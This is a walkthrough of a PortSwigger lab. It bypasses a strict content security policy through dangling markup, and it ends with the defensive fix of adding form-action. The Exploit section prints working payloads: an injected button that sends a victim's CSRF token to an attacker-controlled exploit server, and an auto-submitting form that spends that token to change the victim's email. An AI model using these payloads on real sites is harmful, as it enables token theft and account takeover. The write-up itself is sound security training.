# Reflected XSS protected by very strict CSP, with dangling markup attack

**Category:** Cross-Site Scripting (XSS)
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

A CSP that blocks every script source, inline or external, looks like it should end the conversation —
no script execution means no XSS impact, full stop. But CSP only governs *script*. It says nothing
about `<form>` submissions, and a policy with no `form-action` directive leaves an attacker free to
redirect any form on the page anywhere they want, CSRF token included.

## The Target

The account page's email-change form, protected by a CSP strict enough to block every flavor of
inline or injected script we tried — `default-src 'self'` with no `unsafe-inline`, no allowed external
script hosts. The form itself posts to `/my-account/change-email` with the user's new email and a
hidden CSRF token. Our own reconnaissance and the CSP header inspection both confirmed the policy had
no `form-action` directive at all, meaning form submissions were entirely unrestricted regardless of
how tightly scripts were locked down.

## The Investigation

With script execution off the table, the attack had to work through markup and form semantics
instead. HTML buttons support a `formaction` attribute that overrides the enclosing form's `action`
URL specifically for that button, and `formmethod` that overrides the submission method — both are
plain HTML attributes, not JavaScript, so CSP's script restrictions never come into play. Injecting a
`<button formaction="...">` inside the existing email-change form hijacks where that form's data goes
the moment the injected button is clicked, without needing a single line of script.

The remaining problem was the CSRF token itself. The form submits via POST by default, which puts the
CSRF token in the request body — invisible to us unless we can read server-side logs. Overriding the
submission to `formmethod=GET` moves every form field, CSRF token included, into the URL, which our
exploit server's request log captures directly. That gave us a clean two-stage plan: first steal the
CSRF token via a GET-method form hijack, then use that token in a normal (attacker-controlled) POST
request to actually change the victim's email.

## The Exploit

**Stage 1 — steal the CSRF token.** We injected a submit button into the email field, closing the
existing attribute first:

```
"><button type=submit formaction="EXPLOIT-SERVER-URL/log" formmethod=GET formnovalidate>Click me</button>
```

delivered via the exploit server as a full-page redirect to
`/my-account?email=<injected button>`. `formnovalidate` skips the browser's own field-format
validation on the injected value, and the "Click me" label is required so the platform's simulated
victim identifies it as something to click. When the victim clicked the injected button, their browser
submitted the entire form — including the hidden CSRF token — as a GET request to our exploit server,
landing the token directly in our access log as
`GET /log?email=&csrf=TOKEN`.

**Stage 2 — spend the stolen token.** With the CSRF token extracted from the log, we delivered a
second exploit page:

```html
<form action="LAB-URL/my-account/change-email" method="POST">
  <input name="email" value="hacker@evil-user.net">
  <input name="csrf" value="STOLEN_TOKEN">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

This runs on the exploit server's own origin, not the lab's, so the lab's CSP never applies to it —
it's just a normal cross-origin form POST carrying the stolen token, which the lab's server accepts as
valid because the token itself is legitimate. The victim's email changed to `hacker@evil-user.net`,
solving the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution reaches the same underlying exploit — a `formaction`/`formmethod=GET`
button hijack to steal the CSRF token, followed by a script that spends it — but walks a materially
different, more manual path to get there. Their solution starts by discovering that the email field
has *client-side* validation (`type="email"`) that rejects raw HTML, requiring a DevTools step to
change the input's `type` attribute from `email` to `text` before a payload like
`foo@example.com"><img src= onerror=alert(1)>` can even be submitted through the browser's own form.
They then confirm the CSP blocks execution via the DevTools console, discover the missing
`form-action` directive, and build up the same two-stage formaction/GET-method attack we did — but
their final delivery is a single adaptive script that checks the URL for a `csrf` parameter and either
submits the email-change form directly (if the token is already present) or redirects to generate one
first.

The real divergence is in how the client-side email-type validation gets bypassed. PortSwigger's
walkthrough is built around a human using DevTools to change the live input's `type` attribute before
typing an XSS payload into it — a browser-only obstacle that only exists because their attack is
driven through the actual rendered form. Our approach set the `email` query parameter directly in a
crafted URL rather than typing into the form field, which never touches the client-side `type="email"`
validation at all — that validation only fires against user interaction with the input element itself,
not against a URL parameter the server reflects into the page. Both paths land on the identical core
vulnerability (missing `form-action` in the CSP) and the identical hijack technique; ours simply
skips a browser-UI obstacle that doesn't exist when driving the request directly.

## What This Teaches Us

CSP's `script-src` and `default-src` directives say nothing about form submissions, and `form-action`
is the directive that actually restricts where forms on the page can send data — a strict CSP that
omits it leaves every form on the page hijackable via plain HTML, no script required. This is one of
the more important lessons in the whole series: a defense can be airtight for the specific threat it
targets (script execution) and still leave the door open for a materially different attack technique
(dangling markup / form hijacking) that never needed script execution to succeed. The fix is
`form-action 'self'` (or a tighter equivalent) added explicitly to the CSP — it isn't implied by any
other directive and has to be set on purpose.
